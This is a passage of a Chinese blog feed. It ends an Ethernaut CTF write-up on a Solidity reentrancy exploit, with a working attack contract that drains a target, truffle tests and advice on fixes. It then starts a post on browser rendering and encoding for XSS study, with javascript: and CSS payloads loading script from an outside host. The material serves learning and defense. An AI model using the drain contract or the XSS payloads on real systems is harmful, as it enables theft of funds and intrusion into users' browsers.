class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//引入目标合约内容</span></span><br><span class="line"> contract Reentrance &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//.... 和上文一模一样的内容 ....</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自己的攻击合约</span></span><br><span class="line">contract MyContract &#123;</span><br><span class="line">    <span class="comment">//目标合约实例</span></span><br><span class="line">    Reentrance c;</span><br><span class="line">    <span class="comment">//合约拥有者</span></span><br><span class="line">    address owner;</span><br><span class="line">    <span class="comment">//进入payable fallback函数的次数</span></span><br><span class="line">    uint public number;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MyContract</span>(<span class="params">address _c</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="comment">//链接至目标合约</span></span><br><span class="line">        c = Reentrance(_c);</span><br><span class="line">        <span class="comment">//确认合约所有者，用于最后取钱</span></span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        <span class="comment">//直接完成donate步骤，在创建合约时，给一些钱</span></span><br><span class="line">        c.donate.value(msg.value)(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//payable fallback 函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="comment">//计数</span></span><br><span class="line">        number++;</span><br><span class="line">        <span class="comment">//不一定是donate金额的倍数，榨干每一点钱</span></span><br><span class="line">        uint weHave = c.balanceOf(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">if</span> (weHave &gt; c.balance) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c.balance != <span class="number">0</span>) c.withdraw(c.balance);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        c.withdraw(weHave);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用withdraw，需要两次以上的调用，目前不知道原因</span></span><br><span class="line">    <span class="comment">//此处参数可以为0。但是不意味着可以不donate。一次性转钱的最大值就是donate的金额</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        c.withdraw(<span class="number">0</span>);</span><br><span class="line">        c.withdraw(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//提取参数至合约拥有者</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getmoney</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">      owner.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用Remix的操作步骤</p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fuud2btqddj30aa0660ss.jpg" alt="cr6.png"></p><p>创建合约</p><ul><li>前者填写创建合约时，附加的金额，用于donate。</li><li>后者填写目标合约address</li></ul><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fuud2g147zj30a6059t8n.jpg" alt="cr7.png"></p><p>攻击 -&gt; 拿钱</p><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud2k3e27j311w0hwjuc.jpg" alt="cr5.png"></p><p>提交</p><h2 id="基于truffle-本地测试"><a href="#基于truffle-本地测试" class="headerlink" title="基于truffle 本地测试"></a>基于truffle 本地测试</h2><p>下面是利用 <code>truffle</code> + <code>ganache</code> 利用 <code>truffle test</code> 进行本地测试的代码。没有遇到Remix环境下的坑，不知道是链的问题，还是编译器的问题。记录一下过程。</p><p>设置部署文件 <code>2_deploy_contracts.js</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Victim = artifacts.require(<span class="string">'./Victim.sol'</span>)</span><br><span class="line"><span class="keyword">const</span> Attacker = artifacts.require(<span class="string">'./Attacker.sol'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer</span><br><span class="line">    .deploy(Victim)</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span></span><br><span class="line">      deployer.deploy(Attacker, Victim.address)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>链接至ganache测试链，<code>truffle.js</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// See &lt;http://truffleframework.com/docs/advanced/configuration&gt;</span></span><br><span class="line">  <span class="comment">// to customize your Truffle configuration!</span></span><br><span class="line">  networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">      <span class="comment">// host: "10.21.238.12",</span></span><br><span class="line">      <span class="comment">// port: 8545,</span></span><br><span class="line">      host: <span class="string">'localhost'</span>,</span><br><span class="line">      port: <span class="number">7545</span>,</span><br><span class="line">      network_id: <span class="string">"*"</span> <span class="comment">// Match any network id</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>test.js</code>基于js的测试脚本：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> attacker = artifacts.require(<span class="string">"Attacker"</span>);</span><br><span class="line"><span class="keyword">const</span> victim = artifacts.require(<span class="string">"Victim"</span>);</span><br><span class="line"></span><br><span class="line">contract(<span class="string">'test'</span>, <span class="keyword">async</span> (accounts) =&gt; &#123;</span><br><span class="line">    it(<span class="string">"should put 10 in attacker"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</span><br><span class="line">        acct1 = accounts[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> options = &#123; <span class="attr">from</span>: acct1, <span class="attr">to</span>: attacker.address, <span class="attr">value</span>: <span class="number">20</span> &#125;</span><br><span class="line">        <span class="keyword">let</span> result= <span class="keyword">await</span> instance_att.donate.sendTransaction(options)</span><br><span class="line">        <span class="comment">// console.log(result);</span></span><br><span class="line">        <span class="built_in">console</span>.log(getBalance(attacker.address))</span><br><span class="line">        assert.equal(getBalance(attacker.address), <span class="number">20</span>);</span><br><span class="line">     &#125;),</span><br><span class="line">     it(<span class="string">"should put 100 in victim"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance = <span class="keyword">await</span> victim.deployed();</span><br><span class="line">        acct1 = accounts[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> options = &#123; <span class="attr">from</span>: acct1, <span class="attr">to</span>: victim.address, <span class="attr">value</span>: <span class="number">100</span> &#125;</span><br><span class="line">        <span class="keyword">let</span> result= web3.eth.sendTransaction(options)</span><br><span class="line">        <span class="comment">// console.log(result);</span></span><br><span class="line">        <span class="built_in">console</span>.log(getBalance(victim.address))</span><br><span class="line">        assert.equal(getBalance(victim.address), <span class="number">100</span>);</span><br><span class="line">     &#125;),</span><br><span class="line">    <span class="comment">//  it("show attacker and victim", async () =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     let getBalance = web3.eth.getBalance;</span></span><br><span class="line">    <span class="comment">//     console.log(getBalance(victim.address))</span></span><br><span class="line">    <span class="comment">//     console.log(getBalance(attacker.address))</span></span><br><span class="line">    <span class="comment">//     assert.equal(getBalance(victim.address), 100);</span></span><br><span class="line">    <span class="comment">//  &#125;),</span></span><br><span class="line">     it(<span class="string">"attack_ready (transfer 10)"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</span><br><span class="line">        <span class="keyword">let</span> instance_vic = <span class="keyword">await</span> victim.deployed();</span><br><span class="line">        <span class="built_in">console</span>.log(attacker.address)</span><br><span class="line">        <span class="built_in">console</span>.log(accounts[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> instance_att.transfer.sendTransaction(victim.address,<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">let</span> result2 = <span class="keyword">await</span> instance_vic.balanceOf.call(attacker.address,&#123;<span class="attr">from</span>: attacker.address&#125;)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack in vic:"</span>+result2)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfvictim:"</span>+getBalance(victim.address))</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack:"</span>+getBalance(attacker.address))</span><br><span class="line">        assert.equal(getBalance(victim.address), <span class="number">110</span>);</span><br><span class="line">     &#125;),</span><br><span class="line">     it(<span class="string">"attack (get 20)"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</span><br><span class="line">        <span class="keyword">let</span> instance_vic = <span class="keyword">await</span> victim.deployed();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> instance_att.attack()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> result2 = <span class="keyword">await</span> instance_vic.balanceOf.call(attacker.address,&#123;<span class="attr">from</span>: attacker.address&#125;)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack in vic:"</span>+result2)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfvictim:"</span>+getBalance(victim.address))</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack:"</span>+getBalance(attacker.address))</span><br><span class="line">        assert.equal(getBalance(victim.address), <span class="number">90</span>);</span><br><span class="line">     &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fuud2rkcqtj30fn09qdga.jpg" alt="cr8.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>重入漏洞形成原因：</p><ul><li>使用<code>call.value</code>转账，会发送全部Gas，为重入循环转账提供了条件</li><li>资产记录的改变，在实际转账后。漏洞的关键点。</li></ul><p>重入漏洞修补：</p><ul><li>资产记录的改变，在实际转账前。</li><li>不使用<code>call.value</code>，使用<code>transfer</code></li><li>使用安全的加减函数，捕获溢出，形成回滚。</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2" target="_blank" rel="noopener">https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2</a><br><a href="https://bbs.pediy.com/thread-228422.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-228422.htm</a><br><a href="https://blog.riskivy.com/%e6%99%ba%e8%83%bd%e5%90%88%e7%ba%a6ctf%ef%bc%9aethernaut-writeup-part-2/" target="_blank" rel="noopener">https://blog.riskivy.com/%e6%99%ba%e8%83%bd%e5%90%88%e7%ba%a6ctf%ef%bc%9aethernaut-writeup-part-2/</a><br><a href="https://www.secpulse.com/archives/73682.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/73682.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 有意思，填一小块坑 —&lt;/p&gt;
    
    </summary>
    
    
      <category term="区块链" scheme="http://lalajun.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="solidity" scheme="http://lalajun.com/tags/solidity/"/>
    
      <category term="智能合约安全" scheme="http://lalajun.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>浏览器渲染原理与编码解码</title>
    <link href="http://lalajun.com/2018/08/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/"/>
    <id>http://lalajun.com/2018/08/25/浏览器渲染原理与编码解码/</id>
    <published>2018-08-25T09:05:28.000Z</published>
    <updated>2019-04-07T03:50:19.594Z</updated>
    
    <content type="html"><![CDATA[<p>— 被怼番之后，好好学习基础原理 —</p><a id="more"></a><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>突然被电话面试了一波，在XSS这里被怼番了…是真滴菜还一直没有补，哎，潜心研究一下。</p><p>其中有问到浏览器渲染的原理，可以说是没有了解了。可能平常会使用到更相近的是在想办法过滤的时候，需要了解的渲染中URL,HTML,JS编码解码过程。</p><p>这两块内容有着千丝万缕，放在一起学习，记录。</p><hr><h1 id="编码方便回顾小节"><a href="#编码方便回顾小节" class="headerlink" title="编码方便回顾小节"></a>编码方便回顾小节</h1><p>HTMl编码不能对标签（包括标签头 以及其中的属性，结构等），但是可以编码标签之间的内容，以及标签属性””之间的所有内容。可以编码javascript，可以编码alert，可以编码:等符号<br>URL编码不能对伪协议类型进行任何的编码操作：javascript:<br>js编码可以编码alert等标识符，不能编码控制字符<code>(</code>,<code>)</code>,<code>;</code>,<code>&quot;</code>,<code>&#39;</code>等</p><h1 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h1><p>看一个我觉得易于理解的webkit渲染主要流程：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult61719nj30hc081754.jpg" alt="s3.png"></p><p>加上js的作用如下：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fult6vvff2j30jg06baae.jpg" alt="s6.jpg"></p><p><strong>名词解释：</strong></p><ul><li><strong>DOM Tree</strong>：浏览器将HTML解析成树形的数据结构</li><li><strong>CSS Rule Tree(CSSOM)</strong>：浏览器将CSS解析成树形的数据结构。</li><li><strong>Render Tree</strong>：DOM和CSSOM合并后生成Render Tree（渲染树）。渲染树用来计算可见元素的布局并且作为将像素渲染到屏幕上的过程的输入。</li><li><strong>layout</strong>：Webkit中元素的定位称为布局</li><li><strong>reflow</strong>：Gecko中称为回流，重新渲染，第一次渲染也叫这个</li><li><strong>repaint</strong>：重绘，不改变布局改变样式时重绘。比reflow快</li></ul><ul><li><strong>DOMContentLoaded</strong>：仅当DOM加载完成，不包括样式表，图片，flash，触发 DOMContentLoaded 事件</li><li><strong>onload事件</strong>：当页面上所有的DOM，样式表，脚本，图片，flash都已经加载完成了， 触发 onload 事件。</li></ul><ul><li><strong>首屏时间</strong>：当浏览器显示第一屏页面所消耗的时间，在国内的网络条件下，通常一个网站，如果“首屏时间”在2秒以内是比较优秀的，5秒以内用户可以接受，10秒以上就不可容忍了。</li><li><strong>白屏时间</strong>：指浏览器开始显示内容的时间。</li></ul><p>首先知道，以上的步骤不是严格一步步完成的。<br>渲染引擎会力求尽快将内容显示在屏幕上。它不必等到整个 HTML 文档解析完毕之后，就会开始构建render树和设置布局。在不断接收和处理来自网络的其余内容的同时，渲染引擎会将部分内容解析并显示出来。</p><p>以下来慢慢说几个重要的细节</p><h2 id="HTML-gt-DOM树"><a href="#HTML-gt-DOM树" class="headerlink" title="HTML -&gt; DOM树"></a>HTML -&gt; DOM树</h2><p><code>HTML解析器</code> 负责 HTML 变为 DOM树 的构建,地址可以分为<strong>标记化</strong>和<strong>树构建</strong>两个阶段</p><p>具体步骤如下：</p><ul><li>字节转化为字符</li><li>确定特定字符 tokens</li><li>将tokens 转化为 节点</li><li>以 Document 为根节点构建DOM树</li></ul><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult5nzvy2j30v70ha0ti.jpg" alt="s1.png"></p><blockquote><p>DOM 树的构建过程是一个深度遍历过程：当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。 </p></blockquote><h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><p>在html文档的 head 中遇到了一个 link 标记，该标记引用一个外部css，浏览器会立即发出对该资源的请求</p><blockquote><p>由于 HTML解析构建和CSS的解析是相互独立的并不会造成冲突，因此我们通常将css样式放在head中，让浏览器尽早解析css。</p></blockquote><h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>在html文档中 html解析器遇到一个script标记，他会阻塞DOM树的构建，开始下载js，然后将控制权移交给JavaScript引擎解析，执行。等 JavaScript 引擎运行完毕，浏览器会从中断的地方恢复 DOM 构建。</p><blockquote><p>因为js是可能会改变html现有结构，浏览器会在js执行后决定当前文档是否需要进行重新渲染或者重排，所以会堵塞。因此，js引用放在前面会推迟页面首绘时间。</p></blockquote><h2 id="CSS-gt-CSSOM树"><a href="#CSS-gt-CSSOM树" class="headerlink" title="CSS -&gt; CSSOM树"></a>CSS -&gt; CSSOM树</h2><p><strong>CSS解释器</strong>为页面上任何对象计算样式时，浏览器都会从适用于该节点的最通用规则开始（body元素子项，应用虽有body样式），然后规则“向下级联”，以递归的方式优化计算样式。</p><p>构建过程与html相似：</p><ul><li>字符 确定特定字符 tokens</li><li>将tokens 转化为 节点</li><li>构建cssom树</li></ul><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fult5wio0vj30t70e3dld.jpg" alt="s2.png"></p><blockquote><p>css解析过程，自右向左逆向解析。「div div p em」先匹配 em 开始。这样速度快<br>所以css层数嵌套越多，越慢</p></blockquote><h2 id="CSSOM-DOM-gt-render树"><a href="#CSSOM-DOM-gt-render树" class="headerlink" title="CSSOM + DOM -&gt; render树"></a>CSSOM + DOM -&gt; render树</h2><p>DOM 树与 CSSOM树 合并后形成 <strong>render（渲染）树</strong>。有了Render Tree，浏览器已经能知道网页中有哪些节点、各个节点的CSS定义以及他们的从属关系。</p><p><strong>生成过程</strong>：<br>遍历每个DOM树中的node节点，在CSSOM规则树中寻找当前节点的样式，生成渲染树。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult6fs4oij30vy0exjuc.jpg" alt="s4.png"></p><p>注意。不可见的DOM元素不会被插入渲染树。（head元素，disply值为none的隐藏DOM元素 不在渲染树中出现，visibility属性为hidden 的元素将出现在渲染树中）</p><h2 id="布局-loyout-reflow"><a href="#布局-loyout-reflow" class="headerlink" title="布局 loyout/reflow"></a>布局 loyout/reflow</h2><p>当渲染对象被创建并添加到树中，它们并没有位置和大小，计算这些值的过程称为<strong>layout</strong>或<strong>reflow</strong>。</p><p>Html使用基于流的布局模型，意味着大部分时间，可以以单一的途径进行几何计算。流中靠后的元素并不会影响前面元素的几何特性，所以布局可以在文档中从右向左、自上而下的进行。也存在一些例外，比如html tables。</p><p>布局是一个递归的过程，由根渲染对象开始，它对应html文档元素，布局继续递归的通过一些或所有的frame层级，为每个需要几何信息的渲染对象进行计算。</p><p>当 render tree 发生变化时则会重新layout、reflow</p><h3 id="全局、增量"><a href="#全局、增量" class="headerlink" title="全局、增量"></a>全局、增量</h3><p>layout、reflow也有不同的方式。<br>当layout在整棵渲染树触发时，称为<strong>全局layout</strong>。包括全局样式的改变，窗口resize等，窗口resize会马上进行reflow</p><p>有些操作浏览器并不会立刻reflow 或 repaint 一次，而是会把这样的操作积攒一批，然后做一次 reflow，这又叫异步 reflow 或增量异步 reflow</p><h2 id="绘制-Painting"><a href="#绘制-Painting" class="headerlink" title="绘制 Painting"></a>绘制 Painting</h2><p>绘制阶段，遍历渲染树并调用渲染对象的paint方法将它们的内容显示在屏幕上，绘制使用UI基础组件。</p><p>也分为全局绘制，与增量绘制一块矩形区域。<br>除此之外绘制还有特定的顺序，此处不多说。</p><hr><h1 id="渲染过程的解码过程"><a href="#渲染过程的解码过程" class="headerlink" title="渲染过程的解码过程"></a>渲染过程的解码过程</h1><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p>给出一些常见的HTML实体编码，详细<a href="http://www.w3school.com.cn/tags/html_ref_ascii.asp" target="_blank" rel="noopener">ASCII常用参考</a>  <a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">ISO参考</a></p><table><thead><tr><th style="text-align:center">结果</th><th style="text-align:center">实体名称</th><th style="text-align:center">实体编码</th><th>16进制实体编码</th></tr></thead><tbody><tr><td style="text-align:center"><code>&quot;</code></td><td style="text-align:center"><code>&amp;quot;</code></td><td style="text-align:center"><code>&amp;#34;</code></td><td><code>&amp;#x22;</code></td></tr><tr><td style="text-align:center"><code>&#39;</code></td><td style="text-align:center"><code>&amp;apos;</code></td><td style="text-align:center"><code>&amp;#39;</code></td><td><code>&amp;#x27;</code></td></tr><tr><td style="text-align:center"><code>&amp;</code></td><td style="text-align:center"><code>&amp;amp;</code></td><td style="text-align:center"><code>&amp;#38;</code></td><td><code>&amp;#x26;</code></td></tr><tr><td style="text-align:center"><code>:</code></td><td style="text-align:center"></td><td style="text-align:center"><code>&amp;#58;</code></td><td><code>&amp;#x3A;</code></td></tr><tr><td style="text-align:center"><code>&lt;</code></td><td style="text-align:center"><code>&amp;lt;</code></td><td style="text-align:center"><code>&amp;#60;</code></td><td><code>&amp;#x3C;</code></td></tr><tr><td style="text-align:center"><code>=</code></td><td style="text-align:center"></td><td style="text-align:center"><code>&amp;#61;</code></td><td><code>&amp;#x3D;</code></td></tr><tr><td style="text-align:center"><code>&gt;</code></td><td style="text-align:center"><code>&amp;gt;</code></td><td style="text-align:center"><code>&amp;#62;</code></td><td><code>&amp;#x3E;</code></td></tr><tr><td style="text-align:center"><code>?</code></td><td style="text-align:center"></td><td style="text-align:center"><code>&amp;#63;</code></td><td><code>&amp;#x3F;</code></td></tr></tbody></table><p>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那边被实体编码的内容的，即 HTML解析器 不会做解码的工作。</p><p>只有建立起DOM 树，才能对每个节点的内容进行识别，这时候如果出现实体编码，则会进行实体解码。<br>但是这时候解析出来假如有新的标签，那么不会在加入DOM树,只是作为字符串处理。比如<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></p><p>并且不是所有节点内容都会进行实体解码，比如<code>&lt;script&gt;</code>里面的代码</p><p>以上对于标签的识别，并不只是标签头本身，也包括其中的属性、结构等。</p><p>对于标签属性进行html编码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 源码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&amp;#<span class="attr">x3d</span>;"<span class="attr">123</span>"&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 渲染后右键源码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&amp;#<span class="attr">x3d</span>;"<span class="attr">123</span>"&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fult724cztj309n04wwe9.jpg" alt="s7.png"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fult6ov33uj30fx03p0sn.jpg" alt="s5.png"></p><p>点击后不会有跳转到<code>/123</code>页面，说明是不会解析的。标签本身也是同理。</p><p>对于标签内容进行html编码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 源码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x31;&amp;#x32;&amp;#x33;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 渲染后右键源码  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x31;&amp;#x32;&amp;#x33;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>虽然右键源码内容还是html编码的,但是实际可以跳转<br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fult7jzx45j30da03hglf.jpg" alt="s9.png"></p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fult7qap6nj309900zwe9.jpg" alt="s10.png"></p><p>可以换一种更清楚的方式来看结果。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"JavaScript:alert('&amp;#x3C;OK&amp;#x3E;')"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult7thytpj30l204xdfr.jpg" alt="s11.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 测试时发现上面两种情况，不用; 作为编码结束，也可以识别 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x31&amp;#x32&amp;#x33"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fult7852h9j30et03x3yd.jpg" alt="s8.png"></p><p>虽然会有报错说明，但是也是可以识别的。</p><h2 id="CSS编码"><a href="#CSS编码" class="headerlink" title="CSS编码"></a>CSS编码</h2><p>由于CSS通过expression方法控制js，但是只有在IE浏览器中可以使用，但是也已经很早就废弃了，只做一些简单的了解。<br>除此之外还可以通过引入外部链接，文件，url地址来执行js脚本</p><p><strong>CSS 编码解析</strong>是用了一套不太正统的转义策略：<strong>用一个反斜杠，后边跟1~6位十六进制数字构成。</strong>，所以字母e 可以编码为 \65, \065,\000065。</p><p>而因为这样，后边就不能直接紧跟数字或字母，否则会被当成转义里的内容处理，所以CSS 选择了空格作为终止标识，在解码的时候，再将空格去除。</p><p>CSS还支持直接使用反斜杠对非十六进制字符进行转义的方式，就按紧跟着反斜杠后边的字符的字面意思进行解释，这种机制可用来转义引号和反斜杠本身，不过不能转义HTML 控制的字符，比如尖括号，那是因为HTML 解析器总是先于CSS 解析器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@import'http://ha.ckers.org/xss.css';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">-moz-bingding</span>:<span class="built_in">url</span>(<span class="string">"http://ha.ckers.org/xssmoz.xml#xss"</span>)&#125;</span><span class="tag">&lt;/<span 